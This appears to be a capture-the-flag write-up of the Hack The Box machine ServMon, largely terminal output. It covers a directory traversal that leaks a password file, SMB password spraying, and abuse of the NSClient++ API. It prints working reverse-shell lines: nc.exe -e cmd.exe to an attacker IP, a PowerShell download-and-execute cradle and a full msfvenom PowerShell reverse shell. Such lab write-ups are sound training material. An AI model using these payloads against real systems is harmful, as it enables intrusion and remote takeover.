# ServMon

```
root@kali:/home/kali/htb/ServMon# nmap -p- -sV -sC 10.129.34.191 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 08:53 EDT
Nmap scan report for 10.129.34.191
Host is up (0.027s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  11:05AM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|     :Saturday
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.91%I=7%D=3/19%Time=60549F01%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=3/19%Time=60549F09%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\0\
SF:x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\x18\xd3P\x12"
SF:)%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDo
SF:cument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nCo
SF:ntent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,
SF:"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20fo
SF:und")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
SF:nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-19T13:57:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.95 seconds
root@kali:/home/kali/htb/ServMon# 
```


The webserver is a NVMS-1000 login. I throw it into searchsploit.

```
root@kali:/home/kali/htb/ServMon# searchsploit nvms
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                                    | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification                   | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                                 | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                                | hardware/webapps/48311.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/ServMon# 
```

I test the directory traversal, and it works. But it might not be needed, as we have anonymous ftp access:

```
root@kali:/home/kali/htb/ServMon# ftp 10.129.34.191
Connected to 10.129.34.191.
220 Microsoft FTP Service
Name (10.129.34.191:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:05AM       <DIR>          Users
226 Transfer complete.
ftp> 
```

I find two users Nathan and Nadine. Each has a text file.

Nadine had Confidential:

```
root@kali:/home/kali/htb/ServMon# cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
root@kali:/home/kali/htb/ServMon# 
```

And Notes to do for Nathan:

```
root@kali:/home/kali/htb/ServMon# cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
root@kali:/home/kali/htb/ServMon# 
```

I try using the directory traversal to get the text file:

`10.129.34.191/../../../../../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt`

but I get a 404.

I decide to use dotdotpwn to do it instead, as it will test all the possible ways to traverse:

```
root@kali:/home/kali/htb/ServMon# dotdotpwn -m http -h 10.129.34.191 -M GET -f /Users/Nathan/Desktop/Passwords.txt
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                              - DotDotPwn v3.0.2 -                             #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################

[+] Report name: Reports/10.129.34.191_03-19-2021_09-31.txt

[========== TARGET INFORMATION ==========]
[+] Hostname: 10.129.34.191
[+] Protocol: http
[+] Port: 80

[=========== TRAVERSAL ENGINE ===========]
[+] Creating Traversal patterns (mix of dots and slashes)
[+] Multiplying 6 times the traversal patterns (-d switch)
[+] Creating the Special Traversal patterns
[+] Translating (back)slashes in the filenames
[+] Appending '/Users/Nathan/Desktop/Passwords.txt' to the Traversal Strings
[+] Including Special sufixes
[+] Traversal Engine DONE ! - Total traversal tests created: 5514

[=========== TESTING RESULTS ============]
[+] Ready to launch 3.33 traversals per second
[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)

[*] HTTP Status: 404 | Testing Path: http://10.129.34.191:80/../Users/Nathan/Desktop/Passwords.txt
[*] HTTP Status: 404 | Testing Path: http://10.129.34.191:80/../../Users/Nathan/Desktop/Passwords.txt

[*] Testing Path: http://10.129.34.191:80/../../../Users/Nathan/Desktop/Passwords.txt <- VULNERABLE!

[*] Testing Path: http://10.129.34.191:80/../../../../Users/Nathan/Desktop/Passwords.txt <- VULNERABLE!

[*] Testing Path: http://10.129.34.191:80/../../../../../Users/Nathan/Desktop/Passwords.txt <- VULNERABLE!

[*] Testing Path: http://10.129.34.191:80/../../../../../../Users/Nathan/Desktop/Passwords.txt <- VULNERABLE!
[*] HTTP Status: 404 | Testing Path: http://10.129.34.191:80/..%5CUsers%5CNathan%5CDesktop%5CPasswords.txt
[*] HTTP Status: 404 | Testing Path: http://10.129.34.191:80/..%5C..%5CUsers%5CNathan%5CDesktop%5CPasswords.txt

[*] Testing Path: http://10.129.34.191:80/..%5C..%5C..%5CUsers%5CNathan%5CDesktop%5CPasswords.txt <- VULNERABLE!

[*] Testing Path: http://10.129.34.191:80/..%5C..%5C..%5C..%5CUsers%5CNathan%5CDesktop%5CPasswords.txt <- VULNERABLE!

[*] Testing Path: http://10.129.34.191:80/..%5C..%5C..%5C..%5C..%5CUsers%5CNathan%5CDesktop%5CPasswords.txt <- VULNERABLE!
^C
[+] Total Traversals found: 7

```

-m is the module we want to test, HTTP

-h is the host

-M is the http method to use, GET

-f is a certain file we want to get.


For some reason, it did not work in the browser, or in curl. But when I tried it in burpsuite, it worked fine.

```
HTTP/1.1 200 OK

Content-type: text/plain

Content-Length: 156

Connection: close

AuthInfo: 



1nsp3ctTh3Way2Mars!

Th3r34r3To0M4nyTrait0r5!

B3WithM30r4ga1n5tMe

L1k3B1gBut7s@W0rk

0nly7h3y0unGWi11F0l10w

IfH3s4b0Utg0t0H1sH0me

Gr4etN3w5w17hMySk1Pa5$
```

So now we have a list of passwords.

I run through the list with crackmapexec:

```
root@kali:/home/kali/htb/ServMon# cme smb 10.129.34.191 -u "Nadine" -p passwords.txt 
/usr/local/lib/python2.7/dist-packages/beautifulsoup4-4.8.2-py2.7.egg/bs4/element.py:16: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.
  'The soupsieve package is not installed. CSS selectors cannot be used.'
SMB         10.129.34.191   445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:SERVMON) (signing:False) (SMBv1:False)
SMB         10.129.34.191   445    SERVMON          [-] SERVMON\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.34.191   445    SERVMON          [-] SERVMON\Nadine: STATUS_LOGON_FAILURE 
SMB         10.129.34.191   445    SERVMON          [-] SERVMON\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.34.191   445    SERVMON          [-] SERVMON\Nadine: STATUS_LOGON_FAILURE 
SMB         10.129.34.191   445    SERVMON          [-] SERVMON\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.34.191   445    SERVMON          [-] SERVMON\Nadine: STATUS_LOGON_FAILURE 
SMB         10.129.34.191   445    SERVMON          [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk 
root@kali:/home/kali/htb/ServMon# 
```


I try ssh'ing in with this password:

```
root@kali:/home/kali/htb/ServMon# ssh nadine@10.129.34.191
The authenticity of host '10.129.34.191 (10.129.34.191)' can't be established.
ECDSA key fingerprint is SHA256:l00hI7FlitUwW9ndgFDHLzImSDNxQcjLOKxQPRmbzls.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.34.191' (ECDSA) to the list of known hosts..
nadine@10.129.34.191's password: 
X11 forwarding request failed on channel 0
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

nadine@SERVMON C:\Users\Nadine\Desktop>

```

I also check the smb share:

```
root@kali:/home/kali/htb/ServMon# smbmap -H 10.129.34.191 -u "Nadine" -p "L1k3B1gBut7s@W0rk"
[+] IP: 10.129.34.191:445       Name: 10.129.34.191                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
root@kali:/home/kali/htb/ServMon# 

```

I find NSClient++ in the program files folder, which is interesting, cause I saw that on the 8443 when I did a small check earlier.

```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1


; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3

; Undocumented key
verify mode = peer-cert

; Undocumented key
insecure = false


; in flight - TODO
[/modules]

; Undocumented key
CheckHelpers = disabled

; Undocumented key
CheckEventLog = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring thr
ough NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will b
e expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an 
%ARGS% will be replaced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."
; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=
script arguments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true

nadine@SERVMON C:\Program Files\NSClient++>
```

And I get the password: `ew2x6SsGTxjRwXOT`

The page is really struggling, and nothing happens.

Opening the page with Opera instead works. But I am not allowed to log in.

I recheck the .ini file and see that allowed hosts is 127.0.0.1

So I'm going to port forward the port.

`ssh -L 8443:127.0.0.1:8443 Nadine@10.129.34.191`

Then I just go to https://127.0.0.1:8443/index.html#/ and the password works.

```
root@kali:/home/kali/htb/ServMon# searchsploit NSClient
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                          | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                                         | windows/local/46802.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/ServMon# 

```

I look at the Privesc:

```
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
        C:\Program Files\NSClient++>nscp web -- password --display
        Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
        @echo off
        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
        nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
        - foobar
                command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
        - foobar
                interval = 1m
                command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
        nc -nlvvp 443
        listening on [any] 443 ...
        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
        Microsoft Windows [Version 10.0.17134.753]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Program Files\NSClient++>whoami
        whoami
        nt authority\system

Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
```



Ok, so we already got most of it done. I transfer the files:

```
root@kali:/home/kali/htb/ServMon# scp nc.exe Nadine@10.129.34.191:C:/Temp
Nadine@10.129.34.191's password: 
nc.exe                                                                          100%   58KB   5.7KB/s   00:10    
root@kali:/home/kali/htb/ServMon# 
root@kali:/home/kali/htb/ServMon# scp evil.bat Nadine@10.129.34.191:C:/Temp
Nadine@10.129.34.191's password: 
evil.bat                                                                        100%   53     1.4KB/s   00:00    
root@kali:/home/kali/htb/ServMon# 

```

The webpage is not playing nice. It's constantly freezing and I'm not getting a shell. Sometimes it goes down completely. The nc.exe file is deleted sometimes.

This server has to be running on a potato. It's extremely frustrating.

So I decided to check the documentation for an easier way. and I found the API

I upload the file using the example code from the documentation:

```
nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.b
at --data-binary "C:\Temp\nc.exe 10.10.14.51 1337 -e cmd.exe"
Enter host password for user 'admin':
Added evil as scripts\evil.bat
```

And then I upload the nc.exe with scp and run this command:


```
nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?tim
e=1m
Enter host password for user 'admin':
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>C:\\Temp\\nc.exe 10.10.14.51 1337 -e cmd.
exe \r\nThe system cannot execute the specified program.","perf":{}}],"result":1}
nadine@SERVMON C:\Users\Nadine>
```

hmm. I did encounter a similar message when I tried to upload winPEAS.exe. And the reason was because this version of windows would not let me run downloaded files.

So I think my two options are to host a smb share and run the file from there. Could result in the same error, or try to run a powershell script.

I tried copying the nc.exe file to binary and then pasting to a file, as it would circumvent downloaded files. But it was too large for the copy paste in ssh.

I could split it up into chunks though. I could also maybe leverage the NSClient to download the nc binary. And maybe that wont trigger the Applocker?

I'll try the powershell approach first. I confirm it exists on the server with `powershell`

```
nadine@SERVMON C:\Temp>curl "http://10.10.14.51/2.bat" --output evil.bat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    95  100    95    0     0     95      0  0:00:01 --:--:--  0:00:01  1217

nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-bi
nary @evil.bat
Added evil as scripts\evil.bat
nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m        
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>powershell \"IEX(New-Object Net.WebClient).downloadString('htt
p://10.10.14.51:80/reverse.ps1')\" \r\nIEX : At line:1 char:1\r\n+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.51',1337
) ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been
 blocked by your antivirus software.\r\nAt line:1 char:1\r\n+ IEX(New-Object Net.WebClient).downloadString('http://10.10.14.51:80/r ...
\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-E
xpression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpress
ionCommand","perf":{}}],"result":1}
nadine@SERVMON C:\Temp>

```
So the script is blocked for malicious content.

I also try with a msfvenom generated bat file:

```
nadine@SERVMON C:\Temp>curl "http://10.10.14.51/1.bat" --output evil.bat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1584  100  1584    0     0   1584      0  0:00:01 --:--:--  0:00:01 17032

nadine@SERVMON C:\Temp>
nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scrip
ts/evil.bat --data-binary @evil.bat
Added evil as scripts\evil.bat

nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/comm
ands/execute?time=1m
{"command":"evil","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>powershell -w hidden -nop -c $a='10.10.14.51';$b=1337;$c=New-O
bject system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object 
System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.
StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecu
te=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length,
 $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {  
  start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($o
b,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and
 $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream
.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {  
        break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true 
-or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.Exit
Code -ne $null) {        break;    }} \r\nAt line:1 char:1\r\n+ $a='10.10.14.51';$b=1337;$c=New-Object system.net.sockets.tcpclient;$ .
..\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been bl
ocked by your antivirus software.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + Ful
lyQualifiedErrorId : ScriptContainedMaliciousContent","perf":{}}],"result":1}
nadine@SERVMON C:\Program Files\NSClient++\scripts>

```
The bat file is also blocked.

I test smbserver.py:
```
root@kali:/home/kali/htb/ServMon# smbserver.py smb .
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

and to test it:

```
nadine@SERVMON C:\Temp>\\10.10.14.51\smb\nc.exe                                                                                        
You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol, which is unsafe and could 
expose your system to attack.
Your system requires SMB2 or higher. For more info on resolving this issue, see: https://go.microsoft.com/fwlink/?linkid=852747        

nadine@SERVMON C:\Temp>

```

So it needs smb2.


I then googled exploit code, cause maybe I was too slow manually. 

I found a python script and uploaded nc.exe to try it:

```
root@kali:/home/kali/htb/ServMon# python3 exploit.py -t 127.0.0.1 -P 8443 -p "ew2x6SsGTxjRwXOT" -c "c:\temp\nc.exe 10.10.14.51 1337 -e cmd.exe"
[!] Targeting base URL https://127.0.0.1:8443
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Enabling External Scripts Module . . .
[!] Configuring Script with Specified Payload . . .
[+] Added External Script (name: aIqBIfJtU)
[!] Saving Configuration . . .
[!] Reloading Application . . .
[!] Waiting for Application to reload . . .
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Triggering payload, should execute shortly . . .
root@kali:/home/kali/htb/ServMon# 

```

But still nothing.

